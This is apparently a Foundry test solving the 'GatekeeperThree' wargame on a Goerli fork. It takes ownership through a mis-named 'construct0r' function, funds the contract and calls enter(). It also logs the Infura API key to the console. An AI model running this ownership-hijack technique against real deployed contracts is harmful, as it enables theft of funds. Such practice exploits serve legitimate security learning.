// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GatekeeperThree.sol";

contract TestAttack is Test {

    string constant public PROJECT_ID = "PROJECT_ID";
    address payable public constant  GATE    = payable(0xc432476Ac1Fc7Fbe171A821c6e432bf599d5cDb5);

    function setUp() external {
        fork(9_328_702);
    }

    function testAttack() public {
        GatekeeperThree gate = GatekeeperThree(GATE);

        //Gain ownership of GatekeeperThree to satisfy gateOne
        console.log("Owner Before: ", gate.owner());
        gate.construct0r();
        console.log("Owner After:  ", gate.owner());

        console.log("Gate balance before: ", address(gate).balance);
        payable(gate).transfer(0.0011 ether);
        console.log("Gate balance before: ", address(gate).balance);

        console.log("Entrant Before: ", gate.entrant());
        gate.enter();
        console.log("Entrant After:  ", gate.entrant());
    }

    function fork(uint ublock) public {
        string memory infuraId = vm.envString(PROJECT_ID);
        console.log(PROJECT_ID, infuraId);

        string memory url = string.concat("https://goerli.infura.io/v3/", infuraId);
        console.log("URL", url);

        uint goerliFork = vm.createFork(url);
        vm.selectFork(goerliFork);
        vm.rollFork(ublock);
    }
}